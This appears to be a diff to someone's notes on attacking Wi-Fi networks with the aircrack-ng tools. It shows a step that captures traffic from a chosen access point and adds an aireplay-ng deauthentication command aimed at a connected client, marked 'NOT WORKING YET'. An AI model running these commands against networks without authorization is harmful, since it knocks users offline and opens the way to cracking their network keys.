@@ -6,4 +6,5 @@
 //Find the BSSID and CH
 5. `sudo airodump-ng -c [CH] --bssid [xx:xx:xx:xx:xx:xx] -w Desktop/ wlan0mon`
 //Find a BSSID/STATION pair, this means the client is connected
-6. `sudo aireplay-ng -0 2 -a 
+6. `sudo aireplay-ng -0 2 -a [xx:xx:xx:xx:xx:xx] -c [xx:xx:xx:xx:xx:xx] wlan0mon  //-a access point   -c client
+//NOT WORKING YET
